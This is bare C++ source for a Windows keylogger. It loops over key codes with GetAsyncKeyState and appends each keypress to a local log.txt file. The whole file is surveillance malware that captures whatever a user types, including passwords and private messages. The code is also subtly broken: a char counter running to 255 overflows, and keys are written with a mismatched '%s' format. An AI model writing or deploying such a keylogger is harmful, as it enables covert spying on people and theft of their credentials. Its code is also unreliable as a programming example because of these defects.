#include <iostream>
#include <Windows.h>

using namespace std;

int save(int _key, char *file);

int main()
{
	char i;

	while (true)
       	{
		for (i = 8; i <= 255; i++) 
		{
			if (GetAsyncKeyState(i) == -32767)
			{
				save(i, "log.txt");
			}
		}
	}
}

int save( int _key, char *file)
{
	cout << _key << endl;

	FILE *OUTPUT_FILE;

	OUTPUT_FILE = fopen(file, "a+");
	fprintf(OUTPUT_FILE, "%s", &_key);
	fclose(OUTPUT_FILE);

	return 0;
}
